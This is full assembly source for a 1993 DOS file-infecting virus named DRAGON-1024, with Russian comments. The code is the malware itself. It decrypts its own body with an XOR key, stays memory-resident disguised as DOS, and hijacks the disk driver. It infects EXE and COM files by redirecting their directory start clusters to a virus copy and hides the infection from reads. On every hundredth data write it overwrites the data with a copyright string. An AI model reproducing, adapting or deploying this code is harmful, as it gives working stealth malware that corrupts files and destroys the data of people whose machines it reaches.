;                     ╔═════════════════════════════╗
;                     ║       MicroVirus Corp.      ║██
;                     ║         Author: anti        ║██
;                     ║     VIRUS FAMILY:  Dragon   ║██
;                     ║         VERSION: 1.0        ║██
;                     ╚═════════════════════════════╝██
;                       ███████████████████████████████

;             ╔═══════════════════════════╤══════════════════╗
;             ║  Name:      DARGON-1024   │ Target: EXE, COM ║██
;             ║  Rating:    Dangerous     │ Stealth:    Yes  ║██
;             ║  Tsr:                Yes  │ Phantom:    Yes  ║██
;             ║  Arming:             Yes  │ Danger(6):    4  ║██
;             ║  Attac Speed:   Very Fast │ Clock:       No  ║██
;             ║  Text Strings:       Yes  │ Echo:       Yes  ║██
;             ╟───────────────────────────┴──────────────────╢██
;             ║  Find Next Target:   SCANING ROOT DIRECTORY  ║██
;             ║  Other viruses:      none                    ║██
;             ╚══════════════════════════════════════════════╝██
;               ████████████████████████████████████████████████

code		segment	para	'code'
		assume	cs:code,ds:code
		org	100h

dragon		proc
		mov	di,offset Begin		;Разшифровка вируса
		mov	cx,1010

		mov	ax,00h			;Ключ для расшифровки (меняется)
Decode:		xor	word ptr [di],ax
		inc	di
		loop	Decode

Begin:		mov	ah,30h			;Запрашиваем версию
		int	21h			;DOS

		cmp	al,04h			;DOS 4.x+ : SI = 0
		sbb	si,si			;DOS 2/3  : SI = -1

		mov	ah,52h			;Запрашиваем аддрес DOS List of
		int	21h			;List в регистры ES:BX

		lds	bx,es:[bx]		;DS:BX указывает на первый DPB
						;( Drive Parametr Block)
search:		mov	ax,[bx+si+15h]		;Запрос сегмента драйвера
		cmp	ax,70h			;Это драйвер диска?
		jne	next			;Если нет взять следующий драйв.
		xchg	ax,cx			;Поместить сегмент в CX
		mov	[bx+si+18h],byte ptr -1
		mov	di,[bx+si+13h]		;Сохраняем смещение драйвера
						;Адрес оригенального драйвера
						;в CX:DI

		mov	[bx+si+13h],offset header ;Записать в DPB наш собственн.
		mov	[bx+si+15h],cs		;заголовок устройства
next:		lds	bx,[bx+si+19h]		;Взять следующий драйвер
		cmp	bx,-1			;Это последний драйвер?
		jne	search			;Эсли нет проверить его

		mov	ds,cx			;DS : сегмент оригенального
						;драйвера
		les	ax,[di+6]		;ES : процедура прерывания
						;AX : процедура стратегии

		mov	word ptr cs:Strat,ax	;Запомнить эти два адреса
		mov	word ptr cs:Intr,es	;для долнейшего использования

		push	cs
		pop	es

		mov	bx,128			;Освободить всю память кроме
		mov	ah,4ah			;2048 байт
		int	21h

		mov	ax,cs			;AX : адрес нашего MCB
		dec	ax
		mov	es,ax
		mov	word ptr es:[01h],08h	;Маскируемся под DOS

		push	cs
		pop	ds

		mov	byte ptr Drive+1,-1	;Сбрасываем номер диска

		mov	dx,offset File		;Заражаем текущий католог
		mov	ah,3dh			;диска C:
		int	21h

		mov	bx,ds:[2ch]		;Освобождаем память занятую
		mov	es,bx			;PSP
		mov	ah,49h
		int	21h	
		xor	ax,ax
		test	bx,bx			;BX = 0?
		jz	boot			;Если да, то мы заразили память
		mov	di,1			;и не занустили зараженный файл
seek:		dec	di			;Поиск конца блока данных DOS
		scasw
		jne	seek
		lea	dx,[di+2]		;SI указывает на имя зараженого
		push	es			;файла
		jmp	short exec

boot:		mov	es,ds:[16h]		;Получить адрес PSP
		mov	bx,es:[16h]
		dec	bx			;Взять его MCB
		xor	dx,dx
		push	es

exec:		push	bx			;Установить блок параметров
		mov	bx,offset param		;адрес коммандной строки
		mov	[bx+4],cs		;Адрес первого FCB
		mov	[bx+8],cs		;Адрес второго FCB
		mov	[bx+12],cs
		pop	ds

		mov	ax,4b00h		;Запустить зараженный файл
		int	21h
		mov	ah,4ch			;Выйти в DOS
		int	21h

;█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
;█               *** Device Driver's Strategy Block ***              █
;█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

Strategy:	pushf
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	ds

		push	es
		pop	ds

		mov	ah,[bx+2]		;AH : команда DOS
		cmp	ah,04h			;Ввод ( четение)?
		je	Work			;Если нет - продолжить проверку
		cmp	ah,08h			;Вывод ( запись)?
		je	Work			;Если нет - продолжить проверку
		cmp	ah,09h			;Вывод с контролем?
		je	Work			;Если нет выйти
		jmp	FuckOut

Work:		call	OrigDrive		;Обработь команду DOS
		call	CheckDrive		;Это новый диск?
		je	CheckData		;Да - заразить его
		call	InfectDisk

CheckData:	mov	ax,[bx+14h]		;Запрос на четение системной
FirstSector:	cmp	ax,10h			;обдасть диска?
		jb	FuckOut			;Да - выйти
LastSector:	cmp	ax,21h
		ja	FuckFile

		call	ChangeSector		;Заразить сектор католога
		jmp	Exit			;Выйти

FuckFile:	mov	ah,es:[bx+2]		;AH : команда DOS
		cmp	ah,08h			;Вывод (четение)?
		je	GoAhead			;Проверить данные
		cmp	ah,09h			;Вывод с контролем?
		jne	FuckOut			;Нет выйти

GoAhead:	mov	ax,es:[bx+14h]		;Четение системной области
		cmp	ax,word ptr cs:LastSector+1 ;диска?
		jb	FuckOut			;Да - выйти
		inc	cs:RecNum		;Увеличить номер записи
		cmp	cs:RecNum,64h		;Это 100 запись?
		jne	FuckOut			;Нет выйти
		mov	cs:RecNum,00h		;Обнулить число записей
		call	DestroyFile		;Разрушить записываемые данные

FuckOut:	call	OrigDrive		;Вызвать оригенальный драйвер
Exit:		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		popf
Inter:		retf				;Выйти

;█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
;█                      *** Infect Disk ***                          █
;█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

InfectDisk	proc	near
		cld				;Запомнить заголовок запроса
		mov	cx,0bh			;в стеке
		mov	si,bx
Save:		lodsw
		push	ax
		loop	Save

		mov	word ptr [bx+0eh],offset VirusEnd ;Установить свой 
		mov	word ptr [bx+10h],cs	;буффер для четения с диска
		mov	byte ptr [bx+2],02h	;Запрашиваем BPB
		call	OrigDrive		;( BIOS Parametr Block)

		lds	si,[bx+12h]		;DS:SI : адрес BPB

		mov	ax,[si+11]		;AX : число секторов FAT
		mov	word ptr cs:FatSec1+3,ax
		push	ax
		dec	ax
		mov	cx,[si]			;CX : Размер сектора в байтах
		mul	cx			;AX : размер FAT в байтах
		mov	word ptr cs:FatSecSize+2,ax
		pop	ax
		shl	ax,01h
		add	ax,[si+3]		;AX : Сектор каталога
		mov	word ptr cs:FirstSector+1,ax
		push	ax

		xor	dx,dx
		mov	ax,[si]
		mov	word ptr cs:Bytes+1,ax
		mov	cx,20h
		div	cx
		mov	cx,ax
		mov	ax,[si+6]		;AX : размер каталога
		div	cx

		pop	di
		add	di,ax			;DI : Первый сектор области
		mov	word ptr cs:LastSector+1,di ;данных
		mov	ax,[si+8]		;AX : общее число секторов
		push	ax
		xor	cx,cx
		mov	cl,[si+2]		;CX : число секторов в кластере
		mov	word ptr cs:Cluster+1,cx

		sub	ax,cx			;Уменьшить число секторов на
		mov	word ptr cs:StartSector+3,ax ;размер одного кластера
		pop	ax
		sub	ax,di
		xor	dx,dx
		div	cx
		inc	ax

		push	es
		pop	ds

FatSec1:	mov	word ptr [bx+14h],01h	;Читаем последний сектор FAT
		mov	word ptr [bx+12h],01h
		mov	byte ptr [bx+2],04h
		call	OrigDrive
		lds	si,[bx+0eh]		;DS:SI : указывает на считанный
						;сектор
		push	bp

		mov	bp,ax			;BP : число кластеров
		cmp	ax,0ff6h		;Это 16 битовый FAT?
		jae	Fat16Bit		;Если нет продолжить

More12Bit:	mov	ax,bp			;Определение смещения для
		mov	cx,03h			;последнего кластера диска
		mul	cx
		shr	ax,01h

		mov	di,ax			;DI : адрес элемента FAT в
		add	di,si			;буффере
FatSecSize:	sub	di,100h
		mov	ax,bp
		test	ax,01h			;Это четный номер кластера?═╗
		mov	ax,[di]			;AX : элемент FAT           ║
		jnz	Chet			;Если нет продолжить      ═╝

		and	ax,0fffh		;Обнулить старшие 4 бита
		jmp	GoOn

Chet:		mov	cl,04h			;Сдвинуть на 4 бита влево
		shl	ax,cl
		jmp	GoOn

GoOn:		cmp	ax,0ff7h		;Это плохой кластер ( BAD)
		je	Bad12Bit		;Если нет продолжить

		test	bp,01h			;Это четный кластер
		jnz	ChetCluster		;Нет - продолжить
		or	ax,0fffh		;Пометить кластер как последний
		mov	[di],ax			;в цепочке ( EOF)
		jmp	Contin

ChetCluster:	mov	dx,0fffh		
		mov	cl,04h
		shl	dx,cl
		or	ax,dx			;Пометить кластер как последний
		mov	[di],ax			;в цепочке ( EOF)
		jmp	Contin

Rest:		jmp	Fuck

More16Bit:	mov	ax,bp
Fat16Bit:	mov	di,ax
		add	di,si
		sub	di,word ptr cs:FatSecSize+2
		mov	ax,[di]			;AX : 16 битовый элемент FAT
		cmp	ax,0fff7h		;Это плохой кластер?
		je	Bad16Bit		;Нет - продолжить
		mov	ax,0ffffh		;Пометить его как последний в
		mov	[di],ax			;цепочке кластеров ( EOF)
		jmp	Contin

Bad16Bit:	call	bad			;Взять предыдущий кластер
		jmp	More16Bit		;Проверить его

Bad12Bit:	call	bad			;Взять предыдущий кластер
		jmp	More12Bit		;Проверить его

Contin:		mov	word ptr cs:Location+1,bp
		pop	bp			;Записать измененый FAT на диск
		push	es
		pop	ds

		call	Write

		push	es
		push	cs
		push	cs
		pop	ds
		pop	es

		mov	si,100h			;Создать копию вируса
		mov	di,offset VirusEnd
		mov	cx,1024
		rep	movsb

Again:		mov	ax,40h			;Взять случайное число
		mov	es,ax
		mov	di,6ch
		mov	ax,word ptr es:[di]

		cmp	ax,00h			;Число равно нулю
		je	Again			;Да взять другое число

		mov	word ptr cs:VirusEnd+7,ax ;Сохранить ключ для
		mov	word ptr cs:Key+1,ax	;расшифровки

		mov	di,offset VirusEnd	;Зашифровать вирус
		add	di,14
		mov	cx,1010
Key:		mov	ax,00h			;Ключ для шифровки ( меняется)
Coding:		xor	word ptr [di],ax
		inc	di
		loop	Coding

		pop	es
		push	es
		pop	ds

		mov	word ptr [bx+0eh],offset VirusEnd
		mov	word ptr [bx+10h],cs	;Записать зашифрованную копию
StartSector:	mov	word ptr [bx+14h],14h	;вируса на диск
		mov	word ptr [bx+12h],02h
		call	Write

Fuck:		push	es			;Восстановить заголовок запроса
		pop	ds
		std
		mov	cx,0bh
		mov	di,bx
		add	di,20
Load:		pop	ax
		stosw
		loop	Load
		ret				;Выйти
InfectDisk	endp

;█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
;█                 *** Infect or Disinfect Directory ***             █
;█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

ChangeSector	proc	near
		xor	dx,dx
		mov	ax,[bx+12h]		;Количество секторов
Bytes:		mov	cx,10h			;CX : размер сектора ( меняется)
		mul	cx
		mov	di,ax			;DI : размер в байтах
		lds	si,[bx+0eh]		;DS:SI : адрес буффера с данными
		add	di,si			;DS:DI : адрес конца буффера
		xor	cx,cx			;Признак заражения

		push	ds			;Сохранить адрес буффера
		push	si

		call	InfectSector		;Заразить каталог
		jcxz	NoInfect		;Мы изменили каталог?
		call	Write			;Да - записать на диск

NoInfect:	pop	si			;Восстановить адрес буффера
		pop	ds
		inc	cl			;Признак выкусывания вируса
						;из зараженных файлов
		call	InfectSector		;Вылечить каталог
		ret				;Выйти
ChangeSector	endp

;█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
;█                   *** Infect or Disinfect Files ***               █
;█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

InfectSector	proc	near
More:		mov	ax,[si+8]		;AX : первые две буквы расширения
		cmp	ax,'XE'			;Это EXE- файл?
		jne	COM			;Нет проверить дальше
		cmp	[si+0ah],al
		je	Infect
COM:		cmp	ax,'OC'			;Это COM- файл?
		jne	NextFile		;Нет - взять следующий файл
		cmp	byte ptr [si+0ah],'M'
		jne	NextFile

Infect:		cmp	word ptr [si+28],1024	;Файл меньше 1024 байта?
		jb	NextFile		;Да - взять следующий файл
		test	byte ptr [si+0bh],1ch	;Это директория или системный
						;файл
		jnz	NextFile		;Да - взять следующий файл
		test	cl,cl			;Заражение?
		jnz	Disinfect		;Да - заразить файл

Location:	mov	ax,714			;AX : кластер содержащий вирус
						;( меняется)
		cmp	ax,[si+1ah]		;Это файл заражен?
		je	NextFile		;Да - взять следующий файл
		xchg	ax,[si+1ah]		;Заразить файл, AX : стартовый
		xor	ax,666h			;кластер файла
		mov	[si+12h],ax		;Поместить его в область DOS
		inc	ch			;Признак изменения каталога
		jmp	NextFile		;Взять следующий файл

Disinfect:	xor	ax,ax
		xchg	ax,[si+12h]		;AX : старый стартовый кластер
		xor	ax,666h			;зараженного файла
		mov	[si+1ah],ax		;Вылечить файл

NextFile:	add	si,20h			;Адрес следующего файла
		cmp	di,si
		jne	More
		ret
InfectSector	endp

;█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
;█                       *** Destroy Files ***                       █
;█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

DestroyFile	proc	near
		push	es
		push	cs
		pop	ds
		les	di,es:[bx+0eh]		;ES:DI : адрес записываемых
						;данных
		mov	si,offset CopyRight	;DS:SI : адрес строки с информац.
		mov	cx,120			;CX : длина строки
		rep	movsb			;Уничтожить данные
		pop	es
		ret				;Выйти
DestroyFile	endp

;█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
;█                       *** Write to Disk ***                       █
;█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

Write		proc	near
		mov	ah,es:[bx+2]		;Сохраняем команду DOS
		mov	byte ptr es:[bx+2],08h	;Команда вывод ( записи)
		call	OrigDrive		;Вызвать оригинальный драйвер
						;диска
		mov	es:[bx+2],ah		;Восстановить команду DOS
		and	byte ptr es:[bx+4],7fh	;Сбросить флаг ошибки
		ret
Write		endp

;█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
;█                         *** Check Disk ***                        █
;█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

CheckDrive	proc	near
		mov	al,[bx+1]		;AL : номер диска

drive:		cmp	al,-1			;Диск сменился?
		mov	byte ptr cs:[drive+1],al ;Запомнить номер диска?
		jne	Change			;Да - выйти. Нет проверить не
						;сменился ли флоппи диск
		push	[bx+0eh]
		mov	byte ptr [bx+2],01h	;Команда Контроля носителя
		call	OrigDrive		;Вызвать драйвер диска
		cmp	byte ptr [bx+0eh],01h	;Диск сменился?
		pop	[bx+0eh]
		mov	[bx+2],ah		;Восстановить команду DOS

Change:		ret
CheckDrive	endp

;█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
;█                     *** Get Next Cluster ***                      █
;█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

Bad		proc	near
		dec	bp			;Уменьшить номер кластера
Cluster:	mov	ax,00h			;AX : число секторов в кластере
						;( меняется)
		sub	word ptr cs:StartSector+3,ax
		ret
Bad		endp

;█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
;█                *** Call Original Device Drive ***                 █
;█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

OrigDrive	proc	near
	;	jmp	far 70h:xxxxh
		db	9ah			;Вызвать процедуру Стратегии
Strat:		dw	?,70h			;оригенального драйвкра диска
	;	jmp	far 70h:xxxxh
		db	9ah			;Вызвать процедуру Прерывания
Intr:		dw	?,70h			;оригенального драйвкра диска
		ret
OrigDrive	endp

dragon		endp

;█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
;█                         *** Data Area ***                         █
;█                               Begin                               █
;█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

header:		inc	ax
		ret
		dw	1
		dw	2000h			;Аттрибут устройства:
						;Блоковое, формат не IBM
		dw	offset Strategy		;Адрес поцедуры Стратегии
		dw	offset Inter		;Адрес процедуры Прерывания
		db	7fh			;Число блоковых устройств

file		db	'c:\dragon.com',0
param		dw	0,80h,?,5ch,?,6ch,?	;Параметры для запуска
						;зараженного файла

CopyRight	db	'DRAGON ver 1.0 Copyright (c) MicroVirus Corp. 1993',0
Lords		db	'The Lords of the Computers !',0,0
Lord		db	'DRAGON - the Lord of Disks !',0,0
Author		db	'anti'
RecNum		db	?			;Номер записи
VirusEnd	db	?

;█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
;█                         *** Data Area ***                         █
;█                                End                                █
;█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

code		ends
		end	dragon